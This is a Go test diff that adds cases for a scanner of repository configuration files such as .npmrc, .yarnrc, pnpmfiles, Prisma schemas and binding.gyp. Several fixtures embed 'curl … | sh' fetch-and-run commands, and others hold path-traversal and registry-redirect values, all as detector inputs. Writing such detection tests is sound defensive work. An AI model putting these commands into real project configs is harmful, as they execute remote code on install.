@@ -188,6 +188,30 @@ func TestAnalyze(t *testing.T) {
 		{name: "git lfs filter chained with a download is still reported", path: ".git/config", data: "[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f && curl https://a.test/x | sh\n\tprocess = git-lfs filter-process\n\tclean = git-lfs-evil clean\n", want: []string{"009:2", "009:4", "011:2"}},
 		{name: "git config values are graded even for a known tool", path: ".git/config", data: "[core]\n\thooksPath = .husky/_\n\tsshCommand =\n[filter \"x\"]\n\tprocess = git lfs filter-process\n"},
 		{name: "git config benign values", path: ".git/config", data: "[core]\n\tfsmonitor = true\n\thooksPath = .husky/_\n\tsshCommand =\n[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f\n[user]\n\tname = x\n"},
+		{name: ".npmrc defaults and unrelated keys", path: ".npmrc", data: "save-exact=true\nengine-strict=true\nfund=false\nignore-scripts=false\nregistry=https://registry.npmjs.org/ ; the default\n"},
+		{name: ".npmrc registry and scoped registry on another host", path: "app/.npmrc", data: "# registries\nregistry=https://npm.sinkhole.test/\n@acme:registry=\"https://npm.acme.test/\"\n//npm.acme.test/:_authToken=${NPM_TOKEN}\nregistry=\n", want: []string{"013:2", "013:3"}},
+		{name: ".npmrc node-options script-shell and git run commands", path: ".npmrc", data: "node-options=--require ./hook.js\nscript-shell=curl https://a.test/x | sh\ngit=./bin/git\nnode-options=\n", want: []string{"011:2", "013:1", "013:2", "013:3"}},
+		{name: ".npmrc userconfig and globalconfig", path: ".npmrc", data: "userconfig=./.npmrc-user\nglobalconfig = ./g\nuserconfig=\n", want: []string{"013:1", "013:2"}},
+		{name: ".npmrc prefix and cache inside the repo", path: ".npmrc", data: "prefix=.npm-global\ncache=./.cache\n", want: []string{"013:1", "013:2"}},
+		{name: ".npmrc prefix and cache outside the repo", path: ".npmrc", data: "prefix=/usr/local\ncache=~/.npm\ncache=${HOME}/.npm\n; cache=.x\n"},
+		{name: ".yarnrc committed release and a registry on another host", path: ".yarnrc", data: "yarn-path \".yarn/releases/yarn-1.22.19.js\"\nregistry \"https://npm.sinkhole.test\"\n", want: []string{"013:2", "014:1"}},
+		{name: ".yarnrc yarn-path outside .yarn/releases", path: ".yarnrc", data: "# yarn\nyarn-path \"./scripts/yarn.js\"\n", want: []string{"013:2"}},
+		{name: ".yarnrc defaults and unrelated keys", path: ".yarnrc", data: "--install.ignore-scripts true\nregistry \"https://registry.yarnpkg.com\"\nlonely\n"},
+		{name: ".yarnrc.yml standard Yarn Berry setup", path: ".yarnrc.yml", data: "nodeLinker: node-modules\nyarnPath: .yarn/releases/yarn-4.5.0.cjs\n", want: []string{"014:2"}},
+		{name: ".yarnrc.yml yarnPath outside .yarn/releases", path: ".yarnrc.yml", data: "yarnPath: tools/yarn.cjs\n", want: []string{"013:1"}},
+		{name: ".yarnrc.yml yarnPath that leaves the releases folder", path: ".yarnrc.yml", data: "yarnPath: \".yarn/releases/../../evil.cjs\"\n", want: []string{"013:1"}},
+		{name: ".yarnrc.yml yarnPath in the releases folder but not named like a release", path: ".yarnrc.yml", data: "yarnPath: .yarn/releases/evil.cjs\n", want: []string{"013:1"}},
+		{name: ".yarnrc.yml registries and plugins", path: ".yarnrc.yml", data: "npmRegistryServer: \"https://registry.yarnpkg.com\"\nnpmScopes:\n  acme:\n    npmRegistryServer: \"https://npm.acme.test\"\nplugins:\n  - path: .yarn/plugins/@yarnpkg/plugin-workspace-tools.cjs\n    spec: \"@yarnpkg/plugin-workspace-tools\"\n  - path: ./plugins/mine.cjs\n  - ./plugins/bare.cjs\nenableTelemetry: false\nunrelated:\n  path: tools/x.cjs\n", want: []string{"013:4", "013:8", "013:9", "014:6"}},
+		{name: ".yarnrc.yml plugins as a flow list", path: ".yarnrc.yml", data: "plugins: [./a.cjs]\n# plugins: [./b.cjs]\n", want: []string{"013:1"}},
+		{name: ".yarnrc.yml empty plugins list and a nested yarnPath", path: ".yarnrc.yml", data: "plugins: []\nsettings:\n  yarnPath: a.js\n"},
+		{name: ".pnpmfile.cjs runs on install", path: ".pnpmfile.cjs", data: "module.exports = { hooks: { readPackage(pkg) { return pkg } } }\n", want: []string{"015:1"}},
+		{name: ".pnpmfile.cjs command is graded", path: "web/.pnpmfile.cjs", data: "const { execSync } = require('child_process')\nexecSync('curl https://a.test/x | sh')\n", want: []string{"011:2", "015:1"}},
+		{name: ".pnpmfile.mjs runs on install", path: ".pnpmfile.mjs", data: "export const hooks = {}\n", want: []string{"015:1"}},
+		{name: "Prisma schema with package providers", path: "prisma/schema.prisma", data: "generator client {\n  provider = \"prisma-client-js\"\n}\ngenerator zod { provider = \"@acme/Zod-Gen\" }\ndatasource db {\n  provider = \"postgresql\"\n  url = env(\"DATABASE_URL\")\n}\n"},
+		{name: "Prisma generator providers that are commands", path: "schema.prisma", data: "generator a {\n  provider = \"node ./gen.js\"\n}\ngenerator b {\n  provider = \"./gen.sh\"\n}\ngenerator c {\n  provider = \"prisma-client-js && curl https://a.test/x | sh\"\n}\ngenerator d { provider = env(\"GEN\") }\n// generator e { provider = \"sh x\" }\ngenerator f {\n  output = \"x }\"\n  provider = \"x y\"\n}\ngenerator g {\n  output = \"x\"\n}\n", want: []string{"011:8", "016:10", "016:14", "016:2", "016:5", "016:8"}},
+		{name: "node-gyp file without expansions", path: "binding.gyp", data: "{\n  'targets': [{ 'target_name': 'addon', 'sources': ['addon.cc'] }]\n}\n"},
+		{name: "node-gyp expansions are graded and actions listed", path: "binding.gyp", data: "{\n  'targets': [{\n    'include_dirs': [\"<!@(node -p \\\"require('node-addon-api').include\\\")\"],\n    'defines': ['<!(curl https://a.test/x | sh)'],\n    # 'x': '<!(echo hi)'\n    'actions': [{ 'action_name': 'gen' }]\n  }]\n}\n", want: []string{"011:4", "017:3", "017:4", "018:6"}},
+		{name: "node-gyp include file with pymod_do_main", path: "deps/common.gypi", data: "{'variables': {'x': '<!pymod_do_main(gen)'}}\n", want: []string{"017:1"}},
 		{name: "setup.py", path: "setup.py", data: "import os\nfrom setuptools import setup\nsetup(name='x')\n", want: []string{"007:3"}},
 		{name: "setup.py without a setup call", path: "setup.py", data: "print(1)\n", want: []string{"007:1"}},
 		{name: "pyproject backend-path", path: "pyproject.toml", data: "[project]\nbackend-path = ['x']\n[build-system]\nrequires = []\nbackend-path = ['build']\nbuild-backend = 'b'\n", want: []string{"007:5"}},
@@ -231,6 +255,32 @@ func TestAnalyzeSkips(t *testing.T) {
 
 			if len(got) != 0 {
 				t.Errorf("findings = %v, want none", got)
+			}
+			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
+				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
+			}
+		})
+	}
+}
+
+func TestAnalyzePaddedPnpmfile(t *testing.T) {
+	tests := []struct {
+		name string
+		// inputs
+		path string
+		data string
+		// expectations: the finding stays, the contents are skipped
+		want       []string
+		wantReason string
+	}{
+		{name: "pnpmfile larger than the limit is still reported", path: ".pnpmfile.cjs", data: strings.Repeat("/", analyze.MaxConfigSize+1), want: []string{"015:1"}, wantReason: "too_large"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got, out := findings(t, tt.path, tt.data)
+
+			if !slices.Equal(got, tt.want) {
+				t.Errorf("findings = %v, want %v", got, tt.want)
 			}
 			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
 				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
